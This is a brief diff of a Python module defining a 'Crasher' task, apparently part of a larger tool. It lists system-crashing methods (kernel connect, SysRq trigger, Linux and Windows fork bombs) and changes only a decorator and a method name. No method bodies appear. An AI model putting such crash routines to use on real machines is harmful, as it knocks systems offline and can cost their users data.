@@ -1,5 +1,4 @@
 from tasks.__task import Task
-from utils import threaded_task
 
 
 class MethodKernelconnect:
@@ -83,8 +82,7 @@ class Crasher(Task):
         self.methods = [MethodKernelconnect, MethodSysrqTrigger, MethodLinuxForkBomb,
                         MethodWindowsForkBomb]
 
-    @threaded_task
-    def start(self):
+    def run(self):
         from sys import platform
         from infos import administrator
         failed = []
